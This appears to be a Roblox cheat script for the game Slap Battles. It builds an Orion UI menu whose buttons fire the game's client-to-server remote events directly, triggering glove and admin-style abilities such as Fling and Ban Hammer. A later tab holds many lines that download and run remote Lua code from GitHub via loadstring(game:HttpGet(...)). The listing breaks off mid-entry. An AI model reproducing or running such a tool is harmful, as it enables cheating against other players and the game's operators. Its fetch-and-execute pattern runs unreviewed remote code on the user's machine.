Tab:AddButton({
	Name = "Snowball",
	Callback = function()   
fireclickdetector(workspace.Lobby["Snowball"].ClickDetector)
wait(0.1)
local args = {
    [1] = CFrame.new(0, 0, 0) * CFrame.Angles(0, 0, 0)
}

game:GetService("ReplicatedStorage").GeneralAbility:FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Fish (DEEP SLUMBER badge)"
})

Tab:AddButton({
	Name = "Fish",
	Callback = function()   
fireclickdetector(workspace.Lobby["Fish"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "🗿 (🗿 badge)"
})

Tab:AddButton({
	Name = "🗿",
	Callback = function()   
fireclickdetector(workspace.Lobby["🗿"].ClickDetector)
wait(0.1)
local args = {
    [1] = CFrame.new(0, 0, 0) * CFrame.Angles(0, 0, 0)
}

game:GetService("ReplicatedStorage").GeneralAbility:FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Voodoo (Insanity badge)"
})

Tab:AddButton({
	Name = "Voodoo",
	Callback = function()   
fireclickdetector(workspace.Lobby["Voodoo"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Kinetic (Kinetically Charged badge)"
})

Tab:AddButton({
	Name = "Kinetic",
	Callback = function()   
fireclickdetector(workspace.Lobby["Kinetic"].ClickDetector)
wait(0.1)
local args = {
    [1] = game:GetService("Players").LocalPlayer.Character.Kinetic,
    [2] = Vector3.new(0, 0, 0)
}

game:GetService("ReplicatedStorage").KineticExpl:FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Boogie (Boogie With It badge)"
})

Tab:AddButton({
	Name = "Boogie",
	Callback = function()   
fireclickdetector(workspace.Lobby["Boogie"].ClickDetector)
wait(0.1)
local args = {
    [1] = game:GetService("Players").LocalPlayer.Character.Boogie,
    [2] = Vector3.new(0, 0, 0)
}

game:GetService("ReplicatedStorage").BoogieBall:FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Recall (Repressed Memories badge)"
})

Tab:AddButton({
	Name = "Recall",
	Callback = function()  
fireclickdetector(workspace.Lobby["Recall"].ClickDetector) 
wait(0.1)
local args = {
    [1] = game:GetService("Players").LocalPlayer.Character.Recall,
    [2] = Vector3.new(0, 0, 0)
}

game:GetService("ReplicatedStorage").Recall:InvokeServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Quake (Blasting Off Again badge)"
})

Tab:AddButton({
	Name = "Quake (start)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Quake"].ClickDetector)
wait(0.1)
local args = {
    [1] = {
        ["start"] = true
    }
}

game:GetService("ReplicatedStorage").QuakeQuake:FireServer(unpack(args))
end
})

Tab:AddButton({
	Name = "Quake (finish)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Quake"].ClickDetector)
wait(0.1)
local args = {
    [1] = {
        ["finished"] = true
    }
}

game:GetService("ReplicatedStorage").QuakeQuake:FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Psycho (Ultimate Control badge)"
})

Tab:AddButton({
	Name = "Psycho",
	Callback = function()   
fireclickdetector(workspace.Lobby["Psycho"].ClickDetector)
wait(0.1)
local args = {
    [1] = {
        ["grabEnabled"] = true
    }
}

game:GetService("ReplicatedStorage").Psychokinesis:InvokeServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Kraken (Escape the Abyss badge)"
})

Tab:AddButton({
	Name = "Kraken",
	Callback = function()   
fireclickdetector(workspace.Lobby["Kraken"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").KrakenArm:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Counter (Da Maze Runner badge)"
})

Tab:AddButton({
	Name = "Counter",
	Callback = function()   
fireclickdetector(workspace.Lobby["Counter"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").Counter:FireServer()
end
})

Section = Tab:AddSection({
	Name = "rob (Emissary Of Light badge)"
})

Tab:AddButton({
	Name = "rob",
	Callback = function()   
fireclickdetector(workspace.Lobby["rob"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").rob:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Rojo (See in the dark badge)"
})

Tab:AddButton({
	Name = "Rojo",
	Callback = function()   
fireclickdetector(workspace.Lobby["Rojo"].ClickDetector)
wait(0.1)
local args = {
    [1] = "Release",
    [2] = {
        [1] = CFrame.new(0, 0, 0)
    }
}

game:GetService("ReplicatedStorage").RojoAbility:FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Null (The Relic badge)"
})

Tab:AddButton({
	Name = "Null",
	Callback = function()   
fireclickdetector(workspace.Lobby["Null"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").NullAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Lure (Catch Emm All badge)"
})

Tab:AddButton({
	Name = "Lure",
	Callback = function()   
fireclickdetector(workspace.Lobby["Lure"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Tinkerer (Great Escape badge)"
})

Tab:AddButton({
	Name = "Tinkerer",
	Callback = function()   
fireclickdetector(workspace.Lobby["Tinkerer"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Alchemist (Containment Breach)"
})

Tab:AddButton({
	Name = "Alchemist",
	Callback = function()   
fireclickdetector(workspace.Lobby["Alchemist"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Druid (Gardens And Ghouls badge)"
})

Tab:AddButton({
	Name = "Druid",
	Callback = function()   
fireclickdetector(workspace.Lobby["Druid"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Scythe (Farmland Fray badge)"
})

Tab:AddButton({
	Name = "Scythe",
	Callback = function()   
fireclickdetector(workspace.Lobby["Scythe"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Santa (Epic christmas swag points accumulator badge)"
})

Tab:AddButton({
	Name = "Santa",
	Callback = function()   
fireclickdetector(workspace.Lobby["Santa"].ClickDetector)
wait(0.1)
local args = {
    [1] = "snowpeep"
}

game:GetService("ReplicatedStorage").GeneralAbility:FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Firework (Easy As Pie badge)"
})

Tab:AddButton({
	Name = "Firework",
	Callback = function()   
fireclickdetector(workspace.Lobby["Firework"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Run (It's Finally Over... badge)"
})

Tab:AddButton({
	Name = "Run",
	Callback = function()   
fireclickdetector(workspace.Lobby["Run"].ClickDetector)
wait(0.1)
local args = {
    [1] = Vector3.new(0, 0, 0)
}

game:GetService("ReplicatedStorage").GeneralAbility:FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Lamp (Friend of the Dark badge)"
})

Tab:AddButton({
	Name = "Lamp (leap)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Lamp"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Frostbite (Ice Essence badge)"
})

Tab:AddButton({
	Name = "Frostbite",
	Callback = function()   
fireclickdetector(workspace.Lobby["Frostbite"].ClickDetector)
wait(0.1)
local args = {
    [1] = 0.012500000651925802
}

game:GetService("ReplicatedStorage").GeneralAbility:FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Plank (38000 Slaps)"
})

Tab:AddButton({
	Name = "Plank (Cranking 90’s badge)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Plank"].ClickDetector)
wait(0.1)
local args = {
    [1] = "OutOfBody",
    [2] = {
        ["mousebehavior"] = Enum.MouseBehavior.Default,
        ["ismoving"] = false,
        ["dir"] = Vector3.new(0, 0, 0)
    }
}

game:GetService("ReplicatedStorage").Blink:FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Siphon (Caution: High Voltage badge)"
})

Tab:AddButton({
	Name = "Siphon",
	Callback = function()   
fireclickdetector(workspace.Lobby["Siphon"].ClickDetector)
wait(0.1)
local args = {
    [1] = {
        ["cf"] = CFrame.new(0, 0, 0)
    }
}

game:GetService("ReplicatedStorage").Events.Siphon:FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Fan (FREE OOG! badge)"
})

Tab:AddButton({
	Name = "Fan",
	Callback = function()   
fireclickdetector(workspace.Lobby["Fan"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Materialize (Orb of Honor badge)"
})

Tab:AddButton({
	Name = "Materialize",
	Callback = function()   
fireclickdetector(workspace.Lobby["Materialize"].ClickDetector)
wait(0.1)
local args = {
    [1] = Vector3.new(0, 0, 0)
}

game:GetService("ReplicatedStorage").GeneralAbility:FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Bind (Garden of Erasure badge)"
})

Tab:AddButton({
	Name = "Bind",
	Callback = function()   
fireclickdetector(workspace.Lobby["Bind"].ClickDetector)
wait(0.1)
local args = {
    [1] = "ultimate",
    [2] = {
        ["goal"] = CFrame.new(0, 0, 0) * CFrame.Angles(0, 0, 0),
        ["origin"] = CFrame.new(0, 0, 0) * CFrame.Angles(0, 0, 0)
    }
}

game:GetService("ReplicatedStorage").GeneralAbility:FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Clock (Shattered Memories badge)"
})

Tab:AddButton({
	Name = "Clock (doesnt work)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Clock"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").Events.c4:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Retro (Parkour Pwner badge)"
})

Tab:AddButton({
	Name = "Retro (Sword)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Retro"].ClickDetector)
wait(0.1)
local args = {
    [1] = "SwordSwing"
}

game:GetService("ReplicatedStorage").RetroAbility:FireServer(unpack(args))
end
})

Tab:AddButton({
	Name = "Retro (Rocket Launcher)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Retro"].ClickDetector)
local args = {
    [1] = "Rocket Launcher"
}

game:GetService("ReplicatedStorage").RetroAbility:FireServer(unpack(args))
end
})

Tab:AddButton({
	Name = "Retro (Bomb)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Retro"].ClickDetector)
local args = {
    [1] = "Bomb"
}

game:GetService("ReplicatedStorage").RetroAbility:FireServer(unpack(args))
end
})


Tab:AddButton({
	Name = "Retro (Ban Hammer)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Retro"].ClickDetector)
local args = {
    [1] = "Ban Hammer"
}

game:GetService("ReplicatedStorage").RetroAbility:FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Admin (CERTIFIED ADMIN badge)"
})

Tab:AddButton({
	Name = "Admin (Invisibility)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Admin"].ClickDetector)
wait(0.1)
local args = {
    [1] = "Invisibility"
}

game:GetService("ReplicatedStorage").AdminAbility:FireServer(unpack(args))
end
})

Tab:AddButton({
	Name = "Admin (Anvil)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Admin"].ClickDetector)
local args = {
    [1] = "Anvil"
}

game:GetService("ReplicatedStorage").AdminAbility:FireServer(unpack(args))
end
})

Tab:AddButton({
	Name = "Admin (Fling)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Admin"].ClickDetector)
local args = {
    [1] = "Fling"
}

game:GetService("ReplicatedStorage").AdminAbility:FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Poltergeist (Fetch me their Souls badge)"
})

Tab:AddButton({
	Name = "Poltergeist (spawn)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Poltergeist"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Tab:AddButton({
	Name = "Poltergeist (ability 1)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Poltergeist"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Tab:AddButton({
	Name = "Poltergeist (ability 2)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Poltergeist"].ClickDetector)
wait(0.1)
local args = {
    [1] = "ability2"
}

game:GetService("ReplicatedStorage").GeneralAbility:FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Angler (You’re gonna need a bigger glove)"
})

Tab:AddButton({
	Name = "Angler",
	Callback = function()   
fireclickdetector(workspace.Lobby["Angler"].ClickDetector)
wait(0.1)
local args = {
	"cast"
}
game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Fisherman"):FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Jerry (Snow man left behind)"
})

Tab:AddButton({
	Name = "Jerry",
	Callback = function()   
fireclickdetector(workspace.Lobby["Angler"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").GeneralAbility:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Snowroller (Insane Minds think Alike)"
})

Tab:AddButton({
	Name = "Snowroller (Start)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Snowroller"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage"):WaitForChild("GeneralAbility"):FireServer()
end
})

Tab:AddButton({
	Name = "Snowroller (Throw)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Snowroller"].ClickDetector)
wait(0.1)
local args = {
	"release"
}
game:GetService("ReplicatedStorage"):WaitForChild("GeneralAbility"):FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Draw4 (Oh! That’s a Baseball!)"
})

Tab:AddButton({
	Name = "Draw4",
	Callback = function()   
fireclickdetector(workspace.Lobby["Draw4"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage"):WaitForChild("GeneralAbility"):FireServer()
end
})

Section = Tab:AddSection({
	Name = "Mouse (Rats, We’re Rats, We’re the Rats)"
})

Tab:AddButton({
	Name = "Mouse (Cheese)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Mouse"].ClickDetector)
wait(0.1)
local args = {
	{
		startcf = CFrame.new(),
		charge = 2.3,
		item = "cheese",
		cf = CFrame.new()
	}
}
game:GetService("ReplicatedStorage"):WaitForChild("GeneralAbility"):FireServer(unpack(args))
end
})

Tab:AddButton({
	Name = "Mouse (Trap)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Mouse"].ClickDetector)
wait(0.1)
local args = {
	{
		cf = CFrame.new(),
		data = {
			startcf = CFrame.new(),
			charge = 2.3,
			item = "mouse trap",
			cf = CFrame.new()
		}
	}
}
game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("mousetrap"):FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Hexa (Enlightened)"
})

Tab:AddButton({
	Name = "Hexa",
	Callback = function()   
fireclickdetector(workspace.Lobby["Hexa"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage"):WaitForChild("GeneralAbility"):FireServer()
end
})

Section = Tab:AddSection({
	Name = "Metaverse (Day in the life of a small Game Developer)"
})

Tab:AddButton({
	Name = "Metaverse",
	Callback = function()   
fireclickdetector(workspace.Lobby["Metaverse"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage"):WaitForChild("GeneralAbility"):FireServer()
end
})

Section = Tab:AddSection({
	Name = "Swordfighter (Sword Fighter of The Heights)"
})

Tab:AddButton({
	Name = "Swordfighter",
	Callback = function()   
fireclickdetector(workspace.Lobby["Swordfighter"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage"):WaitForChild("GeneralAbility"):FireServer()
end
})

Section = Tab:AddSection({
	Name = "Tank (Pillow Fight)"
})

Tab:AddButton({
	Name = "Tank",
	Callback = function()   
fireclickdetector(workspace.Lobby["Tank"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage"):WaitForChild("GeneralAbility"):FireServer()
end
})

Section = Tab:AddSection({
	Name = "Eggler (Egging Over It)"
})

Tab:AddButton({
	Name = "Eggler (Tongue)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Eggler"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage"):WaitForChild("GeneralAbility"):FireServer()
end
})

Tab:AddButton({
	Name = "Eggler (Egg Yourself)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Eggler"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("EgglerRAbility"):FireServer()
end
})

Section = Tab:AddSection({
	Name = "Slender (Collect My Pages)"
})

Tab:AddButton({
	Name = "Slender",
	Callback = function()   
fireclickdetector(workspace.Lobby["Slender"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("SlenderRAbility"):FireServer()
end
})

Section = Tab:AddSection({
	Name = "Swashbuckler (Captain’s Orders)"
})

Tab:AddButton({
	Name = "Swashbuckler (Spawn Boat)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Swashbuckler"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage"):WaitForChild("GeneralAbility"):FireServer()
end
})

Tab:AddButton({
	Name = "Swashbuckler (Spawn Treasure)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Swashbuckler"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Swashbuckler"):FireServer()
end
})

Section = Tab:AddSection({
	Name = "Silly (Banished)"
})

Tab:AddButton({
	Name = "Silly",
	Callback = function()   
fireclickdetector(workspace.Lobby["Silly"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage"):WaitForChild("GeneralAbility"):FireServer()
end
})

Section = Tab:AddSection({
	Name = "Slasher (Reawoken)"
})

Tab:AddButton({
	Name = "Slasher",
	Callback = function()   
fireclickdetector(workspace.Lobby["Slasher"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("slasher"):FireServer()
end
})

Section = Tab:AddSection({
	Name = "Car Keys (Slappy Wheels)"
})

Tab:AddButton({
	Name = "Car Keys",
	Callback = function()   
fireclickdetector(workspace.Lobby["Car Keys"].ClickDetector)
wait(0.1)
local args = {
	false
}
game:GetService("ReplicatedStorage"):WaitForChild("GeneralAbility"):FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Reflect (Shattered Reality)"
})

Tab:AddButton({
	Name = "Reflect (Spawn Lightbeam)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Reflect"].ClickDetector)
wait(0.1)
local args = {
	"reflect"
}
game:GetService("ReplicatedStorage"):WaitForChild("GeneralAbility"):FireServer(unpack(args))
end
})

Tab:AddButton({
	Name = "Reflect (Do Reflecting)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Reflect"].ClickDetector)
wait(0.1)
local args = {
	"reflect"
}
game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Reflect"):FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Dave (Dodecacide)"
})

Tab:AddButton({
	Name = "Dave (Smash Hand)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Dave"].ClickDetector)
wait(0.1)
local args = {
	"smash"
}
game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Dave"):FireServer(unpack(args))
end
})

Tab:AddButton({
	Name = "Dave (Summon Nails)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Dave"].ClickDetector)
wait(0.1)
local args = {
	"summon"
}
game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Dave"):FireServer(unpack(args))
end
})

Tab:AddButton({
	Name = "Dave (Hammer)",
	Callback = function()   
fireclickdetector(workspace.Lobby["Dave"].ClickDetector)
wait(0.1)
local args = {
	"hammer",
	workspace:WaitForChild("Nails"):WaitForChild("nail")
}
game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Dave"):FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Mortis (Die Hard)"
})

Tab:AddButton({
	Name = "Mortis",
	Callback = function()   
fireclickdetector(workspace.Lobby["mortis"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage"):WaitForChild("GeneralAbility"):FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "Paint (Color Splash)"
})

Tab:AddButton({
	Name = "Paint",
	Callback = function()   
fireclickdetector(workspace.Lobby["Paint"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").Events.paint:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Plate (Ceramic Panic)"
})

Tab:AddButton({
	Name = "Plate",
	Callback = function()   
fireclickdetector(workspace.Lobby["Plate"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").Events.Plate:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Riftshot (Bullseye)"
})

Tab:AddButton({
	Name = "Riftshot",
	Callback = function()   
fireclickdetector(workspace.Lobby["Riftshot"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").Events.riftshot:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Conker (Autumnal Conkerer)"
})

Tab:AddButton({
	Name = "Conker",
	Callback = function()   
fireclickdetector(workspace.Lobby["Conker"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").Events.Conker:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Wheelchair (Glass Bones)"
})

Tab:AddButton({
	Name = "Wheelchair",
	Callback = function()   
fireclickdetector(workspace.Lobby["Wheelchair"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").Events.Wheelchair:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Elf (Snowball Synergy)"
})

Tab:AddButton({
	Name = "Elf",
	Callback = function()   
fireclickdetector(workspace.Lobby["Elf"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").Events.Elf:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Shopkeeper (Minimum Wage)"
})

Tab:AddButton({
	Name = "Shopkeeper",
	Callback = function()   
fireclickdetector(workspace.Lobby["Shopkeeper"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").Events.Shopkeeper:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Collector (Find The Gloves)"
})

Tab:AddButton({
	Name = "Collector",
	Callback = function()   
fireclickdetector(workspace.Lobby["Collector"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").Events.Collector:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Glaxe (Cleaved in Two)"
})

Tab:AddButton({
	Name = "Glaxe",
	Callback = function()   
fireclickdetector(workspace.Lobby["Glaxe"].ClickDetector)
wait(0.1)
game:GetService("ReplicatedStorage").Events.glaxe:FireServer()
end
})

Section = Tab:AddSection({
	Name = "Titan (no requirements)"
})

Tab:AddButton({
	Name = "Titan (Equip)",
	Callback = function() 
for i, v in pairs(game:GetService("ReplicatedStorage")._NETWORK:GetChildren()) do
	    if v.Name:find("{") then
	        local args = {
	            [1] = "Titan"
	        }
	
	        
	        if v:IsA("RemoteEvent") then
	            v:FireServer(unpack(args))
	        elseif v:IsA("RemoteFunction") then
	            
	            local result = v:InvokeServer(unpack(args))
	            print("Result from InvokeServer:", result)
	        else
	            print("v is neither a RemoteEvent nor a RemoteFunction.")
	        end
	    end
	end
end
})

Tab:AddButton({
	Name = "Titan (Transform)",
	Callback = function() 
local args = {
    [1] = "Transform"
}

game:GetService("ReplicatedStorage").GeneralAbility:FireServer(unpack(args))
end
})

Tab:AddButton({
	Name = "Titan (Ability)",
	Callback = function() 
local args = {
    [1] = "UseAbility",
    [2] = Vector3.new(0, 0, 0)
}

game:GetService("ReplicatedStorage").GeneralAbility:FireServer(unpack(args))
end
})

Section = Tab:AddSection({
	Name = "CUSTOM (394 robux)"
})

Tab:AddButton({
	Name = "CUSTOM",
	Callback = function() 
fireclickdetector(workspace.Lobby["CUSTOM"].ClickDetector)
game:GetService("ReplicatedStorage"):WaitForChild("Rockmode"):FireServer()
end
})

Section = Tab:AddSection({
	Name = "FAQ"
})

Tab:AddParagraph("How to use glove abilities?","1 time click = equip glove/2 time click = use ability")
Tab:AddParagraph("Why is there not all gloves added?","Because some remotes cant be find or they just doesnt work")
Tab:AddParagraph("Why is there no passive gloves?","Passive gloves dont have abilities")
Tab:AddParagraph("Do you need use in lobby or in arena?","Both")
Tab:AddParagraph("Any fixed will be?","Yes, there be some fixes later")
Tab:AddParagraph("How to use glove abilities?","1 time click = equip glove/2 time click = use ability")

Section = Tab:AddSection({
	Name = "Fixed Errors"
})

Tab:AddParagraph("How to fix? (cant equip glove)","You need unlock before using it")
Tab:AddParagraph("How to fix? (some are not working)","You need dm me in discord or wait until i fix it")
Tab:AddParagraph("How to fix? (doesnt load script)","You maybe have executor that doesnt support orion or outdated executor try update it")

-- Custom Gloves Tab
local Tab = Window:MakeTab({
    Name = "Custom Gloves",
    Icon = "rbxassetid://7733955740",
    PremiumOnly = false
})

-- Section: Scripter (You)
Section = Tab:AddSection({
    Name = "Scripter (Me)"
})

Tab:AddButton({
    Name = "Pixelation Glove BETA [Discontinued For Now]",
    Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new()
        wait(1)
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripter-Coder/Scripter-Coder/refs/heads/main/Slap%20Battles/Pixelation%20Glove"))()
    end
})

-- Section: DonjoSyntaX
Section = Tab:AddSection({
    Name = "DonjoSx"
})

Tab:AddButton({
    Name = "Edgelord Glove",
    Callback = function()
        OrionLib:MakeNotification({
            Name = "Error",
            Content = "Script Is Not Found Or Not Released Yet Please Wait Until Release",
            Image = "rbxassetid://7743878857",
            Time = 3
        })
    end
})

Tab:AddButton({
    Name = "Death Glove 0.8",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/DonjoScripts/Public-Scripts/refs/heads/Slap-Battles/death%5B0.8%5D.lua"))()
    end
})

Tab:AddButton({
    Name = "Death Glove Unfinished",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/DonjoScripts/Public-Scripts/refs/heads/Slap-Battles/UnFinishedDeathGlove-MadeByTheFool-.lua"))()
    end
})

Tab:AddButton({
    Name = "Milkman Glove",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/DonjoScripts/Public-Scripts/refs/heads/Slap-Battles/MUI%5BGloveCustom%5D.lua"))()
    end
})

Tab:AddButton({
    Name = "Ultra Instinct Mastered",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/DonjoScripts/Public-Scripts/refs/heads/Slap-Battles/MUI%5BGloveCustom%5D.lua"))()
    end
})

Tab:AddButton({
    Name = "Baldi basic",
    Callback = function()
        GloveSettings = {
	ShowHitboxes = true,
	MuteClientSFX = false,
	HideVisual = false
}
-- alright
loadstring(game:HttpGet('https://raw.githubusercontent.com/dramukin-fermal/Slap-battles/refs/heads/main/CustomGlove_ruler.luau'))()
    end
})

Tab:AddButton({
    Name = "Gojo (unpatching)",
    Callback = function()
        GojoGlove_Settings = {
	ShowHitboxes = true,
	MuteClientSFX = false,
	HideVisual = false
}

-- reminder is everything but sfx are visual, hide visual is currently doesn't work yet.
loadstring(game:HttpGet('https://raw.githubusercontent.com/Umbrella-Scripter/Slap-Battles/refs/heads/main/CustomGlove%3AGojo.lua'))()
    end
})

Tab:AddButton({
    Name = "MUI",
    Callback = function()
        MuiSetting = {
    HideClientVFX = false,
    MuteClientSFX = false,
    ShowHitboxes = false,
}
loadstring(game:HttpGet('https://raw.githubusercontent.com/DonjoScripts/Public-Scripts/refs/heads/Slap-Battles/MUI%5BGloveCustom%5D.lua'))()
    end
})

Tab:AddButton({
    Name = "Killerfish Walmart",
    Callback = function()
        getgenv().DonjoSxKillerfish = {
            FlopPower = 90, -- flop power 
            RamMode = false -- rewrite it to true will make ur fish can attack while flop like a car
        }
loadstring(game:HttpGet("https://raw.githubusercontent.com/Donjosx/SBScriptsLink/refs/heads/main/DonjoSx'sKillerfish.lua"))()
    end
})

-- Section: Incognito Scripts
Section = Tab:AddSection({
    Name = "Incognito Scripts"
})

Tab:AddButton({
    Name = "Sans Glove",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/IncognitoScripts/SlapBattles/refs/heads/main/SansGloveFinished'))()
    end
})

Tab:AddButton({
    Name = "Edgelord Glove",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/IncognitoScripts/SlapBattles/refs/heads/main/Edgelord"))()
    end
})

-- Section: The SPRG
Section = Tab:AddSection({
    Name = "The SPRG"
})

Tab:AddButton({
    Name = "Sprg glove",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Jwjshdiwj/SPRG-glove/refs/heads/main/SPRG%201.5"))()
    end
})

Tab:AddButton({
    Name = "Fe 1k killstreak script (upgraded)",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/KietVN02202/KietVN02202/refs/heads/main/UpgradeFe1KKillstreak"))()
    end
})

Tab:AddButton({
    Name = "SISYPHUS PRIME SCRIPT",
    Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/KietVN02202/KietVN02202/refs/heads/main/SisyphusPrime.lua"))()
    end
})

Tab:AddButton({
